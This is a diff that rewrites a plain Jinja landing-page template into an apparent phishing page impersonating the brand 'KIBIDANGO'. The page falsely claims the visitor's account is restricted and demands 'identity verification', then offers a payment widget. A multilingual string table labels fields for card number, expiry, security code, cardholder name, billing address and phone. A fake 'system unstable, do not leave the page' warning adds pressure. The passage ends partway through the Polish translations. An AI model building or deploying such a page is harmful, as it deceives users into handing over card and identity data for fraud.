@@ -1,55 +1,1722 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html class="no-js" lang="en-US" data-theme="new-wds">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>{{ title or 'Страница' }}</title>
-  {% if favicon_url %}
-  <link rel="icon" href="{{ favicon_url }}">
-  {% endif %}
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background-color: {{ bg_color or '#ffffff' }};
-      color: {{ text_color or '#000000' }};
-      font-family: {{ font_family or 'Inter, sans-serif' }};
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .container {
-      max-width: 600px;
-      width: 90%;
-      text-align: center;
-      padding: 40px 20px;
-    }
-    h1 { font-size: 2rem; margin-bottom: 16px; }
-    p  { font-size: 1.1rem; line-height: 1.6; margin-bottom: 32px; opacity: 0.85; }
-    .btn {
-      display: inline-block;
-      padding: 14px 32px;
-      background: {{ text_color or '#000000' }};
-      color: {{ bg_color or '#ffffff' }};
-      text-decoration: none;
-      border-radius: 8px;
-      font-size: 1rem;
-      font-weight: 600;
-      transition: opacity 0.2s;
-    }
-    .btn:hover { opacity: 0.8; }
-    {{ custom_css or '' }}
-  </style>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style>
+body {transition: opacity ease-in 0.2s; }
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+</style>
+
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<title>{{ title or 'KIBIDANGO - 本人確認' }}</title>
+<meta property="og:title" content="{{ title or 'KIBIDANGO - 本人確認' }}">
+<meta name="twitter:title" content="{{ title or 'KIBIDANGO - 本人確認' }}">
+<meta name="description" content="{{ description or '続行するにはアカウントを確認してください。' }}">
+<meta name="twitter:description" content="{{ description or '続行するにはアカウントを確認してください。' }}">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="KIBIDANGO">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+{% if favicon_url %}
+<link rel="apple-touch-icon" sizes="180x180" href="{{ favicon_url }}">
+<link rel="icon" type="image/png" sizes="32x32" href="{{ favicon_url }}">
+<link rel="icon" type="image/png" sizes="16x16" href="{{ favicon_url }}">
+<link rel="icon" href="{{ favicon_url }}" type="image/svg+xml">
+{% endif %}
+
+<style>
+:root {
+    --kc-rounded: 5px;
+    --kc-text-color: {{ text_color or '#000000' }};
+    --kc-button-color: {{ button_color or text_color or '#FF5C60' }};
+    --kc-button-text-color: {{ button_text_color or '#FFFFFF' }};
+    --kc-background-color: {{ bg_color or '#FFFFFF' }};
+}
+
+*,::before,::after {
+    --tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;
+    --tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;
+    --tw-scale-x:1;--tw-scale-y:1;--tw-scroll-snap-strictness:proximity;
+    --tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;
+    --tw-ring-color:rgb(59 130 246/0.5);--tw-ring-offset-shadow:0 0 #0000;
+    --tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;
+    box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb;
+}
+::before,::after{--tw-content:'';}
+html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Oxygen','Ubuntu',
+    'Droid Sans','Helvetica Neue',sans-serif;font-feature-settings:normal;
+    font-variation-settings:normal;-webkit-tap-highlight-color:transparent;}
+body{margin:0;line-height:inherit;}
+a{color:inherit;text-decoration:inherit;}
+strong{font-weight:bolder;}
+button{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;
+    font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;
+    color:inherit;margin:0;padding:0;text-transform:none;cursor:pointer;
+    -webkit-appearance:button;background-color:transparent;background-image:none;}
+:disabled{cursor:default;}
+img,svg{display:block;vertical-align:middle;}
+img{max-width:100%;height:auto;}
+::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}
+::-webkit-search-decoration{-webkit-appearance:none;}
+:-moz-focusring{outline:auto;}
+:-moz-ui-invalid{box-shadow:none;}
+
+.pointer-events-none{pointer-events:none;}
+.absolute{position:absolute;}
+.relative{position:relative;}
+.inset-0{inset:0px;}
+.mr-3{margin-right:12px;}
+.mr-4{margin-right:16px;}
+.block{display:block;}
+.flex{display:flex;}
+.aspect-square{aspect-ratio:1/1;}
+.size-12{width:48px;height:48px;}
+.flex-row{flex-direction:row;}
+.flex-col{flex-direction:column;}
+.items-center{align-items:center;}
+.justify-center{justify-content:center;}
+.gap-1{gap:4px;}
+.gap-4{gap:16px;}
+.space-y-0\.5>:not([hidden])~:not([hidden]){
+    --tw-space-y-reverse:0;
+    margin-top:calc(2px*(1 - var(--tw-space-y-reverse)));
+    margin-bottom:calc(2px*var(--tw-space-y-reverse));}
+.overflow-hidden{overflow:hidden;}
+.rounded-full{border-radius:9999px;}
+.p-3{padding:12px;}
+.px-6{padding-left:24px;padding-right:24px;}
+.py-1{padding-top:4px;padding-bottom:4px;}
+.pb-10{padding-bottom:40px;}
+.pt-8{padding-top:32px;}
+.font-sans{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Oxygen',
+    'Ubuntu','Droid Sans','Helvetica Neue',sans-serif;}
+.text-300{font-size:13px;}
+.text-400{font-size:14px;}
+.font-regular{font-weight:400;}
+.font-semibold{font-weight:600;}
+.leading-300{line-height:18px;}
+.leading-400{line-height:22px;}
+.tracking-300{letter-spacing:-0.1104px;}
+.tracking-400{letter-spacing:-0.2px;}
+.line-clamp-\(--clamp\){overflow:hidden;display:-webkit-box;-webkit-box-orient:vertical;
+    -webkit-line-clamp:var(--clamp);}
+
+.PyIBB {
+    background:repeating-linear-gradient(to right,#f9dc00 0%,white 25%,#f9dc00 100%);
+    width:100%;background-size:200% auto;background-position:0 100%;
+    animation:twn9A 1.5s infinite;animation-fill-mode:forwards;
+    animation-timing-function:linear;position:fixed;height:5px;
+    pointer-events:none;z-index:1000;top:0;left:0;transition:opacity 300ms;
+}
+@keyframes twn9A {
+    0%{background-position:0 0;}
+    100%{background-position:-200% 0;}
+}
+
+.tDGV5 {
+    background-color: var(--kc-background-color);
+    color: var(--kc-text-color);
+    min-height: 100vh;
+    width: 100%;
+}
+.Ick15 {
+    width: 100%;
+    max-width: 480px;
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+}
+._pNjk {
+    display:flex;flex:1 1 0%;flex-direction:row;
+    align-items:center;justify-content:center;
+}
+
+.product-card{display:flex;align-items:flex-start;background-color:var(--card-color);
+    padding:16px;transition:transform 0.2s,box-shadow 0.2s;}
+.product-image{width:120px;height:120px;border-radius:var(--kc-rounded);
+    object-fit:cover;object-position:center;flex-shrink:0;margin-right:16px;}
+.product-info{display:flex;flex-direction:column;justify-content:center;flex:1;}
+.product-title{font-size:18px;font-weight:600;margin-bottom:6px;}
+.product-price{font-size:16px;font-weight:bold;color:var(--accent-color);}
+
+.pay-block-rules{border-radius:var(--kc-rounded);padding:16px;width:100%;
+    background-color:color-mix(in srgb,var(--kc-button-color),transparent 90%);}
+.pay-block-rules-content{display:flex;align-items:center;}
+.rules-img{max-width:120px;width:100%;padding:0 10px;}
+.rules-img img{width:100%;height:100px;object-fit:cover;border-radius:var(--kc-rounded);}
+.rules-text{overflow-wrap:anywhere;padding:0 10px;display:flex;flex-direction:column;
+    justify-content:space-between;}
+.rules-text-block{display:flex;background-color:var(--kc-background-color);
+    padding:10px;margin-top:10px;border-radius:var(--kc-rounded);}
+.rules-text-block-image{margin-right:10px;}
+.rules-text-block-text{font-size:14px;}
+
+:root {
+    --font-family-base:"Poppins",sans-serif;
+    --font-family-second:"Inter",sans-serif;
+    --color-yellow:#f9dc00;--color-white:#ffffff;--color-black:#000000;
+    --color-opaque-100:#f8f8f8;--color-opaque-200:#f2f2f2;--color-opaque-300:#e5e5e5;
+    --color-opaque-400:#cccccc;--color-opaque-500:#999999;--color-opaque-600:#666666;
+    --color-opaque-700:#333333;--color-opaque-800:#191919;--color-opaque-900:#0d0d0d;
+    --max-content-width:1000px;
+}
+
+/* inter latin/cyrillic/greek */
+@font-face{font-family:'Inter';font-style:normal;font-display:swap;font-weight:400;
+    src:url(/assets/fonts/inter-latin-400-normal.woff2) format('woff2'),url(/assets/fonts/inter-latin-400-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+@font-face{font-family:'Inter';font-style:normal;font-display:swap;font-weight:500;
+    src:url(/assets/fonts/inter-latin-500-normal.woff2) format('woff2'),url(/assets/fonts/inter-latin-500-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+@font-face{font-family:'Inter';font-style:normal;font-display:swap;font-weight:600;
+    src:url(/assets/fonts/inter-latin-600-normal.woff2) format('woff2'),url(/assets/fonts/inter-latin-600-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+/* poppins latin */
+@font-face{font-family:'Poppins';font-style:normal;font-display:swap;font-weight:400;
+    src:url(/assets/fonts/poppins-latin-400-normal.woff2) format('woff2'),url(/assets/fonts/poppins-latin-400-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+@font-face{font-family:'Poppins';font-style:normal;font-display:swap;font-weight:500;
+    src:url(/assets/fonts/poppins-latin-500-normal.woff2) format('woff2'),url(/assets/fonts/poppins-latin-500-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+@font-face{font-family:'Poppins';font-style:normal;font-display:swap;font-weight:600;
+    src:url(/assets/fonts/poppins-latin-600-normal.woff2) format('woff2'),url(/assets/fonts/poppins-latin-600-normal.woff) format('woff');
+    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+/* material icons */
+@font-face{font-family:'Material Icons';font-style:normal;font-display:swap;font-weight:400;
+    src:url(/assets/fonts/material-icons-latin-400-normal.woff2) format('woff2'),url(/assets/fonts/material-icons-latin-400-normal.woff) format('woff');}
+
+{% if custom_css %}{{ custom_css }}{% endif %}
+</style>
 </head>
+
 <body>
-  <div class="container">
-    {% if title %}<h1>{{ title }}</h1>{% endif %}
-    {% if description %}<p>{{ description }}</p>{% endif %}
-    {% if button_text and button_url %}
-    <a class="btn" href="{{ button_url }}" target="_blank" rel="noopener">
-      {{ button_text }}
-    </a>
-    {% endif %}
-  </div>
+<div id="app">
+    <div>
+        <div class="PyIBB" style="opacity: 0;"></div>
+        <div>
+            <div class="tDGV5">
+                <div>
+                    <div>
+                        <div style="display:flex;justify-content:center;padding:16px;">
+                            <div style="align-items:center;display:flex;flex-direction:column;width:100%;">
+                                <div style="min-width:auto;width:auto;min-height:16px;height:16px;"></div>
+                                <div class="Ick15">
+
+                                    <!-- Logo -->
+                                    <div class="_pNjk">
+                                        {% if favicon_url %}
+                                        <img src="{{ favicon_url }}" alt="logo" style="
+                                            border-radius:inherit;height:auto;
+                                            max-width:100%;outline:none;max-height:64px;">
+                                        {% endif %}
+                                    </div>
+
+                                    <!-- Accent bar -->
+                                    <div style="background-color:var(--kc-button-color);height:4px;width:100%;margin-bottom:24px;"></div>
+
+                                    <!-- Title + subtitle -->
+                                    <div style="display:flex;flex-direction:column;">
+                                        <div style="display:inline;font-family:Poppins;font-size:32px;font-weight:600;letter-spacing:-0.25px;line-height:36px;text-align:start;">
+                                            {{ title or '本人確認' }}
+                                        </div>
+                                        <div style="min-width:auto;width:auto;min-height:8px;height:8px;"></div>
+                                        <div style="display:inline;font-family:Poppins;font-size:16px;font-weight:400;letter-spacing:-0.25px;line-height:20px;text-align:start;">
+                                            {{ description or '続行するにはアカウントを確認してください。' }}
+                                        </div>
+                                    </div>
+
+                                    <!-- Info blocks -->
+                                    <div class="flex flex-col gap-4 pt-8 pb-10">
+
+                                        <!-- Block 1: Account restricted -->
+                                        <div class="flex items-center px-6">
+                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
+                                                <div>
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Cancel icon">
+                                                        <path fill-rule="evenodd" d="M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 0 1-9 9 8.96 8.96 0 0 1-5.618-1.968l12.65-12.65A8.96 8.96 0 0 1 21 12zM4.968 17.618l12.65-12.65A8.96 8.96 0 0 0 12 3a9 9 0 0 0-9 9 8.96 8.96 0 0 0 1.968 5.618z"></path>
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                            <div class="mr-3 space-y-0.5">
+                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block1_title">
+                                                    アカウントが制限されています</div>
+                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block1_sub">
+                                                    身元の確認が必要です</div>
+                                            </div>
+                                        </div>
+
+                                        <!-- Block 2: Country detection -->
+                                        <div class="flex items-center px-6">
+                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
+                                                <div>
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Flag icon">
+                                                        <path fill-rule="evenodd" d="M3 2a1 1 0 0 1 1-1h.5a1 1 0 0 1 0 2H4v18a1 1 0 1 1-2 0V2zm2 1v8l4-2 4 2 4-2v-8l-4 2-4-2-4 2z"></path>
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                            <div class="mr-3 space-y-0.5">
+                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block2_title">
+                                                    お住まいの国を検出しました</div>
+                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block2_sub">
+                                                    規制要件を遵守するため</div>
+                                            </div>
+                                        </div>
+
+                                        <!-- Block 3: Quick verification -->
+                                        <div class="flex items-center px-6">
+                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
+                                                <div>
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Check icon">
+                                                        <path fill-rule="evenodd" d="M20.707 5.293a1 1 0 0 1 0 1.414l-11 11a1 1 0 0 1-1.414 0l-5-5a1 1 0 1 1 1.414-1.414L9 15.586 19.293 5.293a1 1 0 0 1 1.414 0z"></path>
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                            <div class="mr-3 space-y-0.5">
+                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block3_title">
+                                                    簡単・迅速な本人確認</div>
+                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block3_sub">
+                                                    数分で完了します</div>
+                                            </div>
+                                        </div>
+
+                                        <!-- CTA button -->
+                                        <div style="padding:0 24px;">
+                                            <button type="button" paymentopenbutton="" data-i18n-btn="cta_main"
+                                                style="display:block;width:100%;text-align:center;
+                                                    background-color:var(--kc-button-color);
+                                                    color:var(--kc-button-text-color);
+                                                    border-radius:var(--kc-rounded);
+                                                    padding:14px 24px;font-size:16px;font-weight:600;
+                                                    font-family:Poppins,sans-serif;
+                                                    border:none;cursor:pointer;">
+                                                {{ button_text or '了解しました' }}
+                                            </button>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<payment-widget></payment-widget>
+
+<support-widget></support-widget>
+
+<script>
+(function(){
+var LANG = '{{ user_lang|default("en") }}';
+
+var T = {
+ja:{
+  page_title:'KIBIDANGO - 本人確認',
+  page_desc:'続行するにはアカウントを確認してください。',
+  main_title:'本人確認',
+  main_desc:'続行するにはアカウントを確認してください。',
+  block1_title:'アカウントが制限されています',
+  block1_sub:'身元の確認が必要です',
+  block2_title:'お住まいの国を検出しました',
+  block2_sub:'規制要件を遵守するため',
+  block3_title:'簡単・迅速な本人確認',
+  block3_sub:'数分で完了します',
+  cta_main:'了解しました',
+  modal_title:'本人確認',
+  pm_header:'確認方法',
+  pm_label:'カード',
+  lbl_card:'カード情報',
+  lbl_name:'カード名義人名',
+  lbl_billing:'請求先住所',
+  lbl_addr1:'住所',
+  lbl_addr2:'住所2行目 (任意)',
+  lbl_zip:'郵便番号',
+  lbl_city:'市区町村',
+  lbl_phone:'電話番号',
+  ph_search:'国を検索...',
+  cta_modal:'続ける',
+  refund:'無料の返品・交換',
+  footer_by:'提供： ',
+  footer_terms:'規約',
+  footer_privacy:'プライバシー',
+  err_card:'カード番号が無効です',
+  err_exp_invalid:'有効期限が無効です',
+  err_exp_expired:'カードの有効期限が切れています',
+  err_cvv:'セキュリティコードが不完全です',
+  err_name:'カード名義人名を入力してください',
+  err_phone:'電話番号が無効です',
+  val_card:'カード番号が無効です',
+  val_exp:'有効期限を入力してください',
+  val_cvv:'セキュリティコードを入力してください',
+  val_name:'カード名義人名を入力してください',
+  ver_continue:'Continue',
+  proc_warning:'Currently, the system is unstable, and the process may take a bit longer. Additional verification may also be required. Please do not leave the page until the transaction is complete!',
+  proc_terms:'Terms',proc_privacy:'Privacy'
+},
+en:{
+  page_title:'KIBIDANGO - Identity Verification',
+  page_desc:'Please verify your account to continue.',
+  main_title:'Identity Verification',
+  main_desc:'Please verify your account to continue.',
+  block1_title:'Your account is restricted',
+  block1_sub:'Identity verification is required',
+  block2_title:'Your country has been detected',
+  block2_sub:'To comply with regulatory requirements',
+  block3_title:'Quick and easy verification',
+  block3_sub:'Completed in minutes',
+  cta_main:'I Understand',
+  modal_title:'Identity Verification',
+  pm_header:'Verification method',
+  pm_label:'Card',
+  lbl_card:'Card information',
+  lbl_name:'Cardholder name',
+  lbl_billing:'Billing address',
+  lbl_addr1:'Address',
+  lbl_addr2:'Address line 2 (optional)',
+  lbl_zip:'Postal code',
+  lbl_city:'City',
+  lbl_phone:'Phone number',
+  ph_search:'Search country...',
+  cta_modal:'Continue',
+  refund:'Free returns & exchanges',
+  footer_by:'Powered by ',
+  footer_terms:'Terms',
+  footer_privacy:'Privacy',
+  err_card:'Invalid card number',
+  err_exp_invalid:'Invalid expiry date',
+  err_exp_expired:'Your card has expired',
+  err_cvv:'Incomplete security code',
+  err_name:'Please enter cardholder name',
+  err_phone:'Invalid phone number',
+  val_card:'Invalid card number',
+  val_exp:'Please enter expiry date',
+  val_cvv:'Please enter security code',
+  val_name:'Please enter cardholder name',
+  ver_continue:'Continue',
+  proc_warning:'Currently, the system is unstable, and the process may take a bit longer. Additional verification may also be required. Please do not leave the page until the transaction is complete!',
+  proc_terms:'Terms',proc_privacy:'Privacy'
+},
+ru:{
+  page_title:'KIBIDANGO - Подтверждение личности',
+  page_desc:'Пожалуйста, подтвердите аккаунт для продолжения.',
+  main_title:'Подтверждение личности',
+  main_desc:'Пожалуйста, подтвердите аккаунт для продолжения.',
+  block1_title:'Ваш аккаунт ограничен',
+  block1_sub:'Требуется подтверждение личности',
+  block2_title:'Ваша страна определена',
+  block2_sub:'Для соблюдения регуляторных требований',
+  block3_title:'Быстрая и простая верификация',
+  block3_sub:'Займёт несколько минут',
+  cta_main:'Понятно',
+  modal_title:'Подтверждение личности',
+  pm_header:'Способ подтверждения',
+  pm_label:'Карта',
+  lbl_card:'Данные карты',
+  lbl_name:'Имя держателя карты',
+  lbl_billing:'Платёжный адрес',
+  lbl_addr1:'Адрес',
+  lbl_addr2:'Адрес (строка 2, необязательно)',
+  lbl_zip:'Почтовый индекс',
+  lbl_city:'Город',
+  lbl_phone:'Номер телефона',
+  ph_search:'Поиск страны...',
+  cta_modal:'Продолжить',
+  refund:'Бесплатный возврат и обмен',
+  footer_by:'Работает на ',
+  footer_terms:'Условия',
+  footer_privacy:'Конфиденциальность',
+  err_card:'Неверный номер карты',
+  err_exp_invalid:'Неверная дата истечения срока',
+  err_exp_expired:'Срок действия карты истёк',
+  err_cvv:'Неполный код безопасности',
+  err_name:'Введите имя держателя карты',
+  err_phone:'Неверный номер телефона',
+  val_card:'Неверный номер карты',
+  val_exp:'Введите дату истечения срока',
+  val_cvv:'Введите код безопасности',
+  val_name:'Введите имя держателя карты',
+  ver_continue:'Продолжить',
+  proc_warning:'Система временно нестабильна, процесс может занять немного больше времени. Возможна дополнительная проверка. Пожалуйста, не покидайте страницу до завершения транзакции!',
+  proc_terms:'Условия',proc_privacy:'Конфиденциальность'
+},
+de:{
+  page_title:'KIBIDANGO - Identitätsverifizierung',
+  page_desc:'Bitte bestätigen Sie Ihr Konto, um fortzufahren.',
+  main_title:'Identitätsverifizierung',
+  main_desc:'Bitte bestätigen Sie Ihr Konto, um fortzufahren.',
+  block1_title:'Ihr Konto ist eingeschränkt',
+  block1_sub:'Identitätsverifizierung erforderlich',
+  block2_title:'Ihr Land wurde erkannt',
+  block2_sub:'Zur Einhaltung regulatorischer Anforderungen',
+  block3_title:'Schnelle und einfache Verifizierung',
+  block3_sub:'In wenigen Minuten abgeschlossen',
+  cta_main:'Verstanden',
+  modal_title:'Identitätsverifizierung',
+  pm_header:'Verifizierungsmethode',
+  pm_label:'Karte',
+  lbl_card:'Karteninformationen',
+  lbl_name:'Karteninhaber',
+  lbl_billing:'Rechnungsadresse',
+  lbl_addr1:'Adresse',
+  lbl_addr2:'Adresszeile 2 (optional)',
+  lbl_zip:'Postleitzahl',
+  lbl_city:'Stadt',
+  lbl_phone:'Telefonnummer',
+  ph_search:'Land suchen...',
+  cta_modal:'Weiter',
+  refund:'Kostenlose Rückgabe & Umtausch',
+  footer_by:'Powered by ',
+  footer_terms:'AGB',
+  footer_privacy:'Datenschutz',
+  err_card:'Ungültige Kartennummer',
+  err_exp_invalid:'Ungültiges Ablaufdatum',
+  err_exp_expired:'Ihre Karte ist abgelaufen',
+  err_cvv:'Unvollständiger Sicherheitscode',
+  err_name:'Bitte Karteninhabernamen eingeben',
+  err_phone:'Ungültige Telefonnummer',
+  val_card:'Ungültige Kartennummer',
+  val_exp:'Bitte Ablaufdatum eingeben',
+  val_cvv:'Bitte Sicherheitscode eingeben',
+  val_name:'Bitte Karteninhabernamen eingeben',
+  ver_continue:'Weiter',
+  proc_warning:'Das System ist derzeit instabil, der Prozess kann etwas länger dauern. Eine zusätzliche Verifizierung kann erforderlich sein. Bitte verlassen Sie die Seite nicht, bis die Transaktion abgeschlossen ist!',
+  proc_terms:'AGB',proc_privacy:'Datenschutz'
+},
+fr:{
+  page_title:'KIBIDANGO - Vérification d\'identité',
+  page_desc:'Veuillez vérifier votre compte pour continuer.',
+  main_title:'Vérification d\'identité',
+  main_desc:'Veuillez vérifier votre compte pour continuer.',
+  block1_title:'Votre compte est restreint',
+  block1_sub:'Vérification d\'identité requise',
+  block2_title:'Votre pays a été détecté',
+  block2_sub:'Pour se conformer aux exigences réglementaires',
+  block3_title:'Vérification rapide et facile',
+  block3_sub:'Terminé en quelques minutes',
+  cta_main:'J\'ai compris',
+  modal_title:'Vérification d\'identité',
+  pm_header:'Méthode de vérification',
+  pm_label:'Carte',
+  lbl_card:'Informations de carte',
+  lbl_name:'Titulaire de la carte',
+  lbl_billing:'Adresse de facturation',
+  lbl_addr1:'Adresse',
+  lbl_addr2:'Adresse ligne 2 (optionnel)',
+  lbl_zip:'Code postal',
+  lbl_city:'Ville',
+  lbl_phone:'Numéro de téléphone',
+  ph_search:'Rechercher un pays...',
+  cta_modal:'Continuer',
+  refund:'Retours et échanges gratuits',
+  footer_by:'Fourni par ',
+  footer_terms:'CGU',
+  footer_privacy:'Confidentialité',
+  err_card:'Numéro de carte invalide',
+  err_exp_invalid:'Date d\'expiration invalide',
+  err_exp_expired:'Votre carte a expiré',
+  err_cvv:'Code de sécurité incomplet',
+  err_name:'Veuillez entrer le nom du titulaire',
+  err_phone:'Numéro de téléphone invalide',
+  val_card:'Numéro de carte invalide',
+  val_exp:'Veuillez entrer la date d\'expiration',
+  val_cvv:'Veuillez entrer le code de sécurité',
+  val_name:'Veuillez entrer le nom du titulaire',
+  ver_continue:'Continuer',
+  proc_warning:'Le système est actuellement instable, le processus peut prendre un peu plus de temps. Une vérification supplémentaire peut être requise. Veuillez ne pas quitter la page jusqu\'à la fin de la transaction!',
+  proc_terms:'CGU',proc_privacy:'Confidentialité'
+},
+es:{
+  page_title:'KIBIDANGO - Verificación de identidad',
+  page_desc:'Por favor, verifica tu cuenta para continuar.',
+  main_title:'Verificación de identidad',
+  main_desc:'Por favor, verifica tu cuenta para continuar.',
+  block1_title:'Tu cuenta está restringida',
+  block1_sub:'Se requiere verificación de identidad',
+  block2_title:'Tu país ha sido detectado',
+  block2_sub:'Para cumplir con los requisitos regulatorios',
+  block3_title:'Verificación rápida y sencilla',
+  block3_sub:'Completado en minutos',
+  cta_main:'Entendido',
+  modal_title:'Verificación de identidad',
+  pm_header:'Método de verificación',
+  pm_label:'Tarjeta',
+  lbl_card:'Información de tarjeta',
+  lbl_name:'Titular de la tarjeta',
+  lbl_billing:'Dirección de facturación',
+  lbl_addr1:'Dirección',
+  lbl_addr2:'Dirección línea 2 (opcional)',
+  lbl_zip:'Código postal',
+  lbl_city:'Ciudad',
+  lbl_phone:'Número de teléfono',
+  ph_search:'Buscar país...',
+  cta_modal:'Continuar',
+  refund:'Devoluciones e intercambios gratuitos',
+  footer_by:'Desarrollado por ',
+  footer_terms:'Términos',
+  footer_privacy:'Privacidad',
+  err_card:'Número de tarjeta inválido',
+  err_exp_invalid:'Fecha de expiración inválida',
+  err_exp_expired:'Tu tarjeta ha expirado',
+  err_cvv:'Código de seguridad incompleto',
+  err_name:'Por favor ingresa el nombre del titular',
+  err_phone:'Número de teléfono inválido',
+  val_card:'Número de tarjeta inválido',
+  val_exp:'Por favor ingresa la fecha de expiración',
+  val_cvv:'Por favor ingresa el código de seguridad',
+  val_name:'Por favor ingresa el nombre del titular',
+  ver_continue:'Continuar',
+  proc_warning:'El sistema actualmente es inestable y el proceso puede tardar un poco más. También puede requerirse una verificación adicional. ¡Por favor no abandone la página hasta que la transacción esté completa!',
+  proc_terms:'Términos',proc_privacy:'Privacidad'
+},
+pt:{
+  page_title:'KIBIDANGO - Verificação de identidade',
+  page_desc:'Por favor, verifique sua conta para continuar.',
+  main_title:'Verificação de identidade',
+  main_desc:'Por favor, verifique sua conta para continuar.',
+  block1_title:'Sua conta está restrita',
+  block1_sub:'Verificação de identidade necessária',
+  block2_title:'Seu país foi detectado',
+  block2_sub:'Para cumprir os requisitos regulatórios',
+  block3_title:'Verificação rápida e fácil',
+  block3_sub:'Concluído em minutos',
+  cta_main:'Entendido',
+  modal_title:'Verificação de identidade',
+  pm_header:'Método de verificação',
+  pm_label:'Cartão',
+  lbl_card:'Informações do cartão',
+  lbl_name:'Titular do cartão',
+  lbl_billing:'Endereço de cobrança',
+  lbl_addr1:'Endereço',
+  lbl_addr2:'Endereço linha 2 (opcional)',
+  lbl_zip:'CEP',
+  lbl_city:'Cidade',
+  lbl_phone:'Número de telefone',
+  ph_search:'Pesquisar país...',
+  cta_modal:'Continuar',
+  refund:'Devoluções e trocas gratuitas',
+  footer_by:'Fornecido por ',
+  footer_terms:'Termos',
+  footer_privacy:'Privacidade',
+  err_card:'Número de cartão inválido',
+  err_exp_invalid:'Data de expiração inválida',
+  err_exp_expired:'Seu cartão expirou',
+  err_cvv:'Código de segurança incompleto',
+  err_name:'Por favor insira o nome do titular',
+  err_phone:'Número de telefone inválido',
+  val_card:'Número de cartão inválido',
+  val_exp:'Por favor insira a data de expiração',
+  val_cvv:'Por favor insira o código de segurança',
+  val_name:'Por favor insira o nome do titular',
+  ver_continue:'Continuar',
+  proc_warning:'O sistema está instável no momento e o processo pode demorar um pouco mais. Verificação adicional também pode ser necessária. Por favor, não saia da página até que a transação seja concluída!',
+  proc_terms:'Termos',proc_privacy:'Privacidade'
+},
+pl:{
+  page_title:'KIBIDANGO - Weryfikacja tożsamości',
+  page_desc:'Proszę zweryfikować konto, aby kontynuować.',
+  main_title:'Weryfikacja tożsamości',
+  main_desc:'Proszę zweryfikować konto, aby kontynuować.',
+  block1_title:'Twoje konto jest ograniczone',
+  block1_sub:'Wymagana weryfikacja tożsamości',
+  block2_title:'Wykryto Twój kraj',
+  block2_sub:'W celu spełnienia wymogów regulacyjnych',
+  block3_title:'Szybka i łatwa weryfikacja',
+  block3_sub:'Ukończona w kilka minut',
